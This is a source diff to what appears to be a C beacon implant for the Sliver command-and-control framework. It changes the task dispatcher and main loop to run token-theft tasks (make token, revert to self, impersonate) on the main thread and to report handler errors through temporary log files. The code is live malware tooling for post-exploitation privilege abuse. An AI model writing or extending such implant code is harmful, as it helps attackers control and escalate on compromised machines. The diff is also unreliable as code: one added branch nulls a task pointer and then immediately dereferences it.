@@ -272,14 +272,40 @@ PENVELOPE* BeaconHandleTaskList
 	REQUEST_HANDLER ReqHandler = NULL;
 	REQUEST_HANDLER* HandlerTable = NULL;
 	PENVELOPE* pResult = NULL;
+	WCHAR wszLogName[MAX_PATH];
+	LPSTR lpError = NULL;
+	PENVELOPE pRespEnvelope = NULL;
 
 	pResult = ALLOC(sizeof(PENVELOPE) * dwNumberOfTasks);
 	HandlerTable = GetSystemHandler();
 
 	for (i = 0; i < dwNumberOfTasks; i++) {
+		if (Tasks[i]->uType == MsgMakeTokenReq) {
+			pResult[i] = Tasks[i];
+			Tasks[i] = NULL;
+		}
+
 		ReqHandler = HandlerTable[Tasks[i]->uType];
 		if (ReqHandler != NULL) {
-			pResult[i] = ReqHandler(Tasks[i], pBeacon);
+			SecureZeroMemory(wszLogName, sizeof(wszLogName));
+			GetTempPathW(_countof(wszLogName), wszLogName);
+			wsprintfW(&wszLogName[lstrlenW(wszLogName)], L"log_%d.txt", GetCurrentThreadId());
+			CreateEmptyFileW(wszLogName);
+			pRespEnvelope = ReqHandler(Tasks[i], pBeacon);
+			if (pRespEnvelope == NULL) {
+				lpError = ReadFromFile(wszLogName, NULL);
+				if (lpError != NULL && lstrlenA(lpError) > 0) {
+					pRespEnvelope = CreateErrorRespEnvelope(lpError, 9, Tasks[i]->uID);
+				}
+				else {
+					pRespEnvelope = CreateErrorRespEnvelope("Failed to execute command (Unknown Error)", 9, Tasks[i]->uID);
+				}
+
+				FREE(lpError);
+			}
+
+			DeleteFileW(wszLogName);
+			pResult[i] = pRespEnvelope;
 			continue;
 		}
 
@@ -373,6 +399,7 @@ VOID BeaconMainLoop
 )
 {
 	DWORD i = 0;
+	DWORD j = 0;
 	PENVELOPE pNextCheckinEnvelope = NULL;
 	PENVELOPE pRecvEnvelope = NULL;
 	PBEACON_TASK BeaconTask = NULL;
@@ -384,6 +411,10 @@ VOID BeaconMainLoop
 	PGLOBAL_CONFIG pConfig = pBeacon->pGlobalConfig;
 	LPVOID* ProfileList = NULL;
 	DWORD cProfiles = 0;
+	WCHAR wszLogName[MAX_PATH];
+	PENVELOPE pReturnedEnvelope = NULL;
+	LPSTR lpError = NULL;
+	UINT64 uType = 0;
 
 	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
 	pSliverPool = InitializeSliverThreadPool();
@@ -451,6 +482,41 @@ VOID BeaconMainLoop
 				pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
 				pWrapper->pTaskList = BeaconTask->EnvelopeList;
 				pWrapper->dwNumberOfTasks = BeaconTask->dwNumberOfEnvelopes;
+				for (j = 0; j < pWrapper->dwNumberOfTasks; j++) {
+					uType = pWrapper->pTaskList[j]->uType;
+					if (uType == MsgMakeTokenReq || uType == MsgRevToSelf || uType == MsgImpersonateReq) {
+						SecureZeroMemory(wszLogName, sizeof(wszLogName));
+						GetTempPathW(_countof(wszLogName), wszLogName);
+						wsprintfW(&wszLogName[lstrlenW(wszLogName)], L"log_%d.txt", GetCurrentThreadId());
+						CreateEmptyFileW(wszLogName);
+						if (uType == MsgMakeTokenReq) {
+							pReturnedEnvelope = MakeTokenHandler(pWrapper->pTaskList[j], pBeacon);
+						}
+						else if (uType == MsgRevToSelf) {
+							pReturnedEnvelope = RevToSelfHandler(pWrapper->pTaskList[j], pBeacon);
+						}
+						else if (uType == MsgImpersonateReq) {
+							pReturnedEnvelope = ImpersonateHandler(pWrapper->pTaskList[j], pBeacon);
+						}
+
+						if (pReturnedEnvelope == NULL) {
+							lpError = ReadFromFile(wszLogName, NULL);
+							if (lpError != NULL && lstrlenA(lpError) > 0) {
+								pReturnedEnvelope = CreateErrorRespEnvelope(lpError, 9, pRecvEnvelope->uID);
+							}
+							else {
+								pReturnedEnvelope = CreateErrorRespEnvelope("Failed to execute command (Unknown Error)", 9, pRecvEnvelope->uID);
+							}
+
+							FREE(lpError);
+						}
+
+						pReturnedEnvelope->uType = uType;
+						pWrapper->pTaskList[j] = pReturnedEnvelope;
+						DeleteFileW(wszLogName);
+
+					}
+				}
 				pWrapper->hEvent = hEvent;
 				pWrapper->pBeacon = pBeacon;
 
